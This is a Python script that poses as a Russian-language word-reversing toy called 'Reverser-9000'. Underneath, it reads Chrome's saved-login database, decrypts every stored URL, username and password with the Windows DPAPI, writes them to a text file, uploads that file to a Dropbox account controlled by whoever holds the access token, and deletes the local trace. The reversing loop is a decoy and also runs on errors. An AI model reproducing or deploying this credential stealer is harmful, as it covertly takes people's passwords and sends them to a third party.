import os
import sqlite3
import win32crypt
import random
import dropbox

access_token = 'topkek' # Insert your dropbox access_token here
usrpath = os.getenv('USERPROFILE')
txt_file = open(usrpath + r"\{}.txt".format(random.getrandbits(20)), 'w+')

path = usrpath + r'\AppData\Local\Google\Chrome\User Data\\Default\Login Data'
try:
    conn = sqlite3.connect(path)
    cursor = conn.cursor()

    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    data = cursor.fetchall()
    my_list = list()

    if len(data) > 0:
        for result in data:
            password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
            my_str = '''URL: {0}
            Username: {1}
            Password: {2}'''.format(result[0], result[1], password)
            my_list.append(my_str)
    else:
        print('### Инициализация реверсера-9000 ###')
        print('------------------------------------')
        print('### Реверс-9000 Инициализирован  ###')
        print('Вводите слова для реверса, :quit для выхода.')
        while True:
            reverse_word = input()
            if reverse_word == ':quit':
                quit(0)
            print(reverse_word[::-1])
    for each in my_list:
        txt_file.write(each)
    client = dropbox.client.DropboxClient(access_token)
    db_file = open(txt_file.name, 'rb')
    txt_file.close()
    response = client.put_file(r'Pass_{}'.format({random.getrandbits(20)}) + '.txt', db_file)
    db_file.close()
    os.remove(txt_file.name)
    print('### Инициализация реверсера-9000 ###')
    print('------------------------------------')
    print('### Реверс-9000 Инициализирован  ###')
    print('Вводите слова для реверса, :quit для выхода.')
    while True:
        reverse_word = input()
        if reverse_word == ':quit':
            quit(0)
        print(reverse_word[::-1])
except BaseException:
    print('####################################')
    print('### Инициализация реверсера-9000 ###')
    print('------------------------------------')
    print('### Реверс-9000 Инициализирован  ###')
    print('Вводите слова для реверса, :quit для выхода.')
    while True:
        reverse_word = input()
        if reverse_word == ':quit':
            quit(0)
        print(reverse_word[::-1])
